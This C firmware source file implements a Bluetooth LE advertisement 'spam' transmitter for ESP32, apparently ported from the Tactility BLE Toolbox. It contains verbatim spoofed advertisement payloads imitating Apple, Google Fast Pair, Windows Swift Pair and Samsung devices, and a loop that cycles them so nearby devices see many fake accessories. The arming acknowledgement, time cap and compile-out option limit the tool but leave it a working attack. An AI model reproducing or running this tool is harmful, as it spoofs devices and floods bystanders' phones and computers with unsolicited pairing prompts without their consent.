/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * BLE Toolbox — the transmit path (the Tactility app's "BLE Spam" screen).
 *
 * *** Why this is gated where it is ***
 *
 * The Wi-Fi toolbox's injection runs on the co-processor and its arming gate is enforced
 * there, so the host cannot transmit by accident or by intent without the gate being
 * opened on the chip that actually radiates. This module is different in a way that
 * matters: the advertisements are transmitted by THIS chip's NimBLE host, through the
 * co-processor's controller. There is no remote gate to lean on, so the gate is
 * enforced here — and "here" is software the same party controls, which is a weaker
 * position and is stated plainly rather than glossed.
 *
 * What that buys, concretely:
 *   - nothing transmits unless arm() has been called with an acknowledgement and a
 *     requested duration, and that lifetime is capped by k_max_hold_us
 *   - the cap and the expiry are checked on every tick, so a lost UI, a stalled task or
 *     a forgotten Stop cannot leave a transmitter running
 *   - the whole module is compiled out unless WIFI_TOOLBOX-style Kconfig says otherwise,
 *     so a shipped product can omit the capability rather than hide it
 *
 * Ported from the Tactility BLE Toolbox (BleSpamPayloads.cpp). The payloads are raw AD
 * structure bytes and are transcribed verbatim; a copy of the upstream file is kept in
 * upstream/ so the transcription can be diffed rather than trusted.
 */

#include "ble_toolbox_spam.h"

#include <string.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"

static const char *TAG = "tb_ble_spam";

#if CONFIG_BLE_TOOLBOX_ALLOW_SPAM

/* ---- Payloads ------------------------------------------------------------
 *
 * Transcribed from upstream/BleSpamPayloads.cpp. Each array is the complete AD data
 * passed verbatim to ble_gap_adv_set_data(); the leading 0xNN of each is that
 * structure's length byte, which is why they look one byte longer than they are. */

#define SPAM_FAMILY_APPLE    0
#define SPAM_FAMILY_ANDROID  1
#define SPAM_FAMILY_WINDOWS  2
#define SPAM_FAMILY_SAMSUNG  3

#define SPAM_FAMILY_COUNT    4

/* ---- Apple: proximity pair (31 bytes, model byte at index 7) ---- */

static const uint8_t k_airpods[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t k_airpods_pro[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t k_airpods_pro2[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t k_airpods_max[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

/* ---- Apple: nearby action (23 bytes, action byte at index 13) ---- */

static const uint8_t k_apple_tv_pair[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x06, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
};

static const uint8_t k_homepod_setup[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x0b, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
};

static const uint8_t k_setup_new_iphone[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x09, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
};

/* ---- Apple: nearby action canonical form (11 bytes, action byte at index 7) ---- */

static const uint8_t k_apple_watch[] = {
    0x0a, 0xff, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x05, 0x00, 0x00, 0x00,
};

static const uint8_t k_apple_vision_pro[] = {
    0x0a, 0xff, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x24, 0x00, 0x00, 0x00,
};

/* ---- Android: Google Fast Pair (14 bytes, model bytes at index 8-10) ---- */

static const uint8_t k_pixel_buds[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x92, 0xbb, 0xbd, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_a_series[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x8b, 0x66, 0xab, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_pro[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x9a, 0xdb, 0x11, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_original[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x00, 0x00, 0x06, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds2[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x06, 0x00, 0x00, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_6b1c64[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x6b, 0x1c, 0x64, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_0582fd[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x05, 0x82, 0xfd, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_pro_567679[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x56, 0x76, 0x79, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_pro_c8e228[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0xc8, 0xe2, 0x28, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_buds_pro_d87a3e[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0xd8, 0x7a, 0x3e, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_8d5b67[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x8d, 0x5b, 0x67, 0x02, 0x0a, 0x00,
};

static const uint8_t k_nest_hub_max[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x07, 0xf4, 0x26, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_3xl_setup[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0xe6, 0x4c, 0xc6, 0x02, 0x0a, 0x00,
};

static const uint8_t k_pixel_2_setup[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x98, 0x9d, 0x0a, 0x02, 0x0a, 0x00,
};

/* ---- Windows: Swift Pair ---- */

static const uint8_t k_swift_pair_core[] = {
    0x06, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80,
};

static const uint8_t k_surface_headphones[] = {
    0x18, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 0x20, 0x48,
    0x65, 0x61, 0x64, 0x70, 0x68, 0x6f, 0x6e, 0x65, 0x73,
};

/* ---- Samsung: Galaxy Buds easy setup (31 bytes, model bytes at index 14/15/17) ---- */

static const uint8_t k_galaxy_buds_white[] = {
    0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xb8, 0xb9,
    0x01, 0x05, 0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x10, 0xff, 0x75,
};

static const uint8_t k_galaxy_buds_black[] = {
    0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xd3, 0x07,
    0x01, 0x04, 0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x10, 0xff, 0x75,
};

static const uint8_t k_galaxy_buds2_white[] = {
    0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xea, 0xaa,
    0x01, 0x17, 0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x10, 0xff, 0x75,
};

/* ---- Samsung: Galaxy Watch easy setup (15 bytes, model byte at index 14) ---- */

static const uint8_t k_galaxy_watch[] = {
    0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x1a,
};

static const uint8_t k_galaxy_watch5_pro[] = {
    0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x15,
};

const char *const ble_toolbox_spam_family_names[SPAM_FAMILY_COUNT] = {
    "Apple", "Android", "Windows", "Samsung",
};

static const ble_toolbox_spam_payload_t k_payloads[] = {
    /* Apple */
    { SPAM_FAMILY_APPLE, "AirPods", k_airpods, sizeof(k_airpods) },
    { SPAM_FAMILY_APPLE, "AirPods Pro", k_airpods_pro, sizeof(k_airpods_pro) },
    { SPAM_FAMILY_APPLE, "AirPods Pro 2", k_airpods_pro2, sizeof(k_airpods_pro2) },
    { SPAM_FAMILY_APPLE, "AirPods Max", k_airpods_max, sizeof(k_airpods_max) },
    { SPAM_FAMILY_APPLE, "Apple TV Pair", k_apple_tv_pair, sizeof(k_apple_tv_pair) },
    { SPAM_FAMILY_APPLE, "HomePod Setup", k_homepod_setup, sizeof(k_homepod_setup) },
    { SPAM_FAMILY_APPLE, "iPhone Setup", k_setup_new_iphone, sizeof(k_setup_new_iphone) },
    { SPAM_FAMILY_APPLE, "Apple Watch", k_apple_watch, sizeof(k_apple_watch) },
    { SPAM_FAMILY_APPLE, "Apple Vision Pro", k_apple_vision_pro, sizeof(k_apple_vision_pro) },
    /* Android */
    { SPAM_FAMILY_ANDROID, "Pixel Buds", k_pixel_buds, sizeof(k_pixel_buds) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds A-Series", k_pixel_buds_a_series, sizeof(k_pixel_buds_a_series) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds Pro", k_pixel_buds_pro, sizeof(k_pixel_buds_pro) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds (original)", k_pixel_buds_original, sizeof(k_pixel_buds_original) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds 2", k_pixel_buds2, sizeof(k_pixel_buds2) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds (6B1C64)", k_pixel_buds_6b1c64, sizeof(k_pixel_buds_6b1c64) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds (0582FD)", k_pixel_buds_0582fd, sizeof(k_pixel_buds_0582fd) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds Pro (567679)", k_pixel_buds_pro_567679, sizeof(k_pixel_buds_pro_567679) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds Pro (C8E228)", k_pixel_buds_pro_c8e228, sizeof(k_pixel_buds_pro_c8e228) },
    { SPAM_FAMILY_ANDROID, "Pixel Buds Pro (D87A3E)", k_pixel_buds_pro_d87a3e, sizeof(k_pixel_buds_pro_d87a3e) },
    { SPAM_FAMILY_ANDROID, "Pixel (8D5B67)", k_pixel_8d5b67, sizeof(k_pixel_8d5b67) },
    { SPAM_FAMILY_ANDROID, "Nest Hub Max", k_nest_hub_max, sizeof(k_nest_hub_max) },
    { SPAM_FAMILY_ANDROID, "Pixel 3 XL Setup", k_pixel_3xl_setup, sizeof(k_pixel_3xl_setup) },
    { SPAM_FAMILY_ANDROID, "Pixel 2 Setup", k_pixel_2_setup, sizeof(k_pixel_2_setup) },
    /* Windows */
    { SPAM_FAMILY_WINDOWS, "Swift Pair", k_swift_pair_core, sizeof(k_swift_pair_core) },
    { SPAM_FAMILY_WINDOWS, "Surface Headphones", k_surface_headphones, sizeof(k_surface_headphones) },
    /* Samsung */
    { SPAM_FAMILY_SAMSUNG, "Galaxy Buds", k_galaxy_buds_white, sizeof(k_galaxy_buds_white) },
    { SPAM_FAMILY_SAMSUNG, "Galaxy Buds (Black)", k_galaxy_buds_black, sizeof(k_galaxy_buds_black) },
    { SPAM_FAMILY_SAMSUNG, "Galaxy Buds2", k_galaxy_buds2_white, sizeof(k_galaxy_buds2_white) },
    { SPAM_FAMILY_SAMSUNG, "Galaxy Watch", k_galaxy_watch, sizeof(k_galaxy_watch) },
    { SPAM_FAMILY_SAMSUNG, "Galaxy Watch5 Pro", k_galaxy_watch5_pro, sizeof(k_galaxy_watch5_pro) },
};

#define SPAM_PAYLOAD_COUNT (sizeof(k_payloads) / sizeof(k_payloads[0]))

/* ---- Gate state ---------------------------------------------------------- */

static bool     s_initialized;
static bool     s_armed;
static int64_t  s_armed_at_us;
static uint32_t s_max_hold_us;
static uint8_t  s_payload_index;
static uint32_t s_sent;
static bool     s_randomize;

size_t ble_toolbox_spam_payload_count(void)
{
    return SPAM_PAYLOAD_COUNT;
}

const ble_toolbox_spam_payload_t *ble_toolbox_spam_payload(size_t index)
{
    return (index < SPAM_PAYLOAD_COUNT) ? &k_payloads[index] : NULL;
}

const ble_toolbox_spam_payload_t *ble_toolbox_spam_payload_for_family(uint8_t family, size_t nth)
{
    size_t seen = 0;

    for (size_t i = 0; i < SPAM_PAYLOAD_COUNT; i++) {
        if (k_payloads[i].family != family) {
            continue;
        }
        if (seen == nth) {
            return &k_payloads[i];
        }
        seen++;
    }

    return NULL;
}

bool ble_toolbox_spam_is_armed(void)
{
    return s_armed;
}

uint32_t ble_toolbox_spam_seconds_left(void)
{
    if (!s_armed) {
        return 0;
    }

    const int64_t elapsed = esp_timer_get_time() - s_armed_at_us;
    if (elapsed >= (int64_t)s_max_hold_us) {
        return 0;
    }

    return (uint32_t)((s_max_hold_us - (uint32_t)elapsed) / 1000000u);
}

uint32_t ble_toolbox_spam_sent(void)
{
    return s_sent;
}

uint8_t ble_toolbox_spam_current_index(void)
{
    return s_payload_index;
}

esp_err_t ble_toolbox_spam_arm(const ble_toolbox_spam_params_t *params)
{
    if (params == NULL || !params->acknowledged) {
        /* The acknowledgement is the whole point of the gate: an arm that can happen
         * without an explicit yes is not a gate. */
        return ESP_ERR_INVALID_ARG;
    }

    if (!ble_toolbox_host_is_ready()) {
        return ESP_ERR_INVALID_STATE;
    }

    uint32_t max_hold_us = params->max_hold_us;
    if (max_hold_us == 0 || max_hold_us > BLE_TOOLBOX_SPAM_MAX_HOLD_US) {
        max_hold_us = BLE_TOOLBOX_SPAM_MAX_HOLD_US;     /* capped, never unlimited */
    }

    s_max_hold_us = max_hold_us;
    s_armed_at_us = esp_timer_get_time();
    s_payload_index = 0;
    s_sent = 0;
    s_randomize = params->randomize_address;
    s_initialized = false;      /* force the next tick to configure advertising */
    s_armed = true;

    ESP_LOGW(TAG, "armed: max hold %u s, randomize %d",
             (unsigned)(max_hold_us / 1000000u), (int)s_randomize);

    return ESP_OK;
}

esp_err_t ble_toolbox_spam_disarm(void)
{
    if (!s_armed) {
        return ESP_OK;
    }

    s_armed = false;
    (void)ble_gap_adv_stop();
    ESP_LOGW(TAG, "disarmed after %u advertisements", (unsigned)s_sent);

    return ESP_OK;
}

/* ---- The transmitting tick ----------------------------------------------
 *
 * Called from a timer while armed. It re-checks the lifetime on every call rather than
 * trusting that something else will stop it: a UI that is closed, a task that stalled or
 * a person who walked away all have to end in a stopped transmitter, and the only way to
 * guarantee that is to make the expiry a condition of transmitting. */

esp_err_t ble_toolbox_spam_tick(void)
{
    if (!s_armed) {
        return ESP_OK;              /* not armed: nothing to do, and nothing to stop */
    }

    if ((esp_timer_get_time() - s_armed_at_us) >= (int64_t)s_max_hold_us) {
        ESP_LOGW(TAG, "hold time expired; stopping");
        return ble_toolbox_spam_disarm();
    }

    const ble_toolbox_spam_payload_t *p = &k_payloads[s_payload_index];

    /* Legacy advertising, not extended: the payloads are the same bytes real devices
     * send and they fit the 31-byte legacy limit, which is what makes them look like the
     * thing they are imitating. Extended advertising would only add reach.
     *
     * Note what the controller does with these: ble_gap_adv_set_data() copies the bytes
     * and checks only the length, with no AD parsing, and the controller puts them on
     * air as given. That is why the Samsung payloads work despite their trailing bytes
     * not parsing — see the payload check in main.cpp. */
    int rc = ble_gap_adv_set_data(p->data, (int)p->length);
    if (rc != 0) {
        ESP_LOGE(TAG, "adv_set_data failed rc=%d", rc);
        s_armed = false;
        return ESP_FAIL;
    }

    if (!s_initialized) {
        /* Non-connectable and non-scannable: this advertises, it does not accept a
         * connection, so nothing here can become a bridge into anyone's device. */
        struct ble_gap_adv_params adv = { 0 };
        adv.conn_mode = BLE_GAP_CONN_MODE_NON;
        adv.disc_mode = BLE_GAP_DISC_MODE_NON;
        adv.itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN;
        adv.itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MIN;

        rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv,
                               NULL, NULL);
        if (rc != 0) {
            /* Falling back to the public address is better than not starting, and the
             * failure to use a random one is worth saying out loud. */
            ESP_LOGW(TAG, "random-address start failed rc=%d, trying public", rc);
            rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv,
                                   NULL, NULL);
            if (rc != 0) {
                ESP_LOGE(TAG, "adv_start failed rc=%d", rc);
                s_armed = false;
                return ESP_FAIL;
            }
        }

        s_initialized = true;
        ESP_LOGW(TAG, "advertising as \"%s\" (%s)", p->label,
                 ble_toolbox_spam_family_names[p->family]);
    }

    s_sent++;

    /* Cycle payloads so the family appears as several devices rather than one that keeps
     * changing its mind — which is what the Tactility app does and what the imitation
     * depends on. ble_gap_adv_set_data() can be called while advertising, so this needs
     * no stop/restart. */
    s_payload_index = (uint8_t)((s_payload_index + 1) % SPAM_PAYLOAD_COUNT);

    return ESP_OK;
}

#else   /* !CONFIG_BLE_TOOLBOX_ALLOW_SPAM */

/* Compiled out. Every entry point still exists so callers do not need to know, and each
 * reports that the capability is absent rather than pretending to succeed — the same
 * posture spec section 10.5 takes for the Wi-Fi toolbox's injection. */

size_t ble_toolbox_spam_payload_count(void) { return 0; }
const ble_toolbox_spam_payload_t *ble_toolbox_spam_payload(size_t index) { (void)index; return NULL; }
const ble_toolbox_spam_payload_t *ble_toolbox_spam_payload_for_family(uint8_t family, size_t nth)
{
    (void)family; (void)nth;
    return NULL;
}
bool ble_toolbox_spam_is_armed(void) { return false; }
uint32_t ble_toolbox_spam_seconds_left(void) { return 0; }
uint32_t ble_toolbox_spam_sent(void) { return 0; }
uint8_t ble_toolbox_spam_current_index(void) { return 0; }
esp_err_t ble_toolbox_spam_arm(const ble_toolbox_spam_params_t *params) { (void)params; return ESP_ERR_NOT_SUPPORTED; }
esp_err_t ble_toolbox_spam_disarm(void) { return ESP_OK; }
esp_err_t ble_toolbox_spam_tick(void) { return ESP_ERR_NOT_SUPPORTED; }

#endif  /* CONFIG_BLE_TOOLBOX_ALLOW_SPAM */

